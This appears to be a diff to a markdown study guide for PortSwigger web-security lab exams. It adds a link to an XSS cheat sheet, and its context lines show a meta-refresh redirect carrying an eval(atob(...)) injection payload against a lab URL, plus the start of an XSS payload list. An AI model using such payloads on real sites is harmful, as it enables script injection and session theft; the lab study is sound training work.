@@ -123,6 +123,7 @@ With <b>`<meta>`</b> html tag we can redirect the "victim" to our javascript inj
 <meta http-equiv="refresh" content='0; URL=https://<LAB_URL>/?SearchTerm=aa","fd8xsw5l":eval(atob("BASE64-PAYLOAD"))}//' />
 ```
 
+Useful source from portswigger during exam: [Cross Site Scriping Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 ### Different XSS Payloads
 ```javascript
 ${alert(1)}
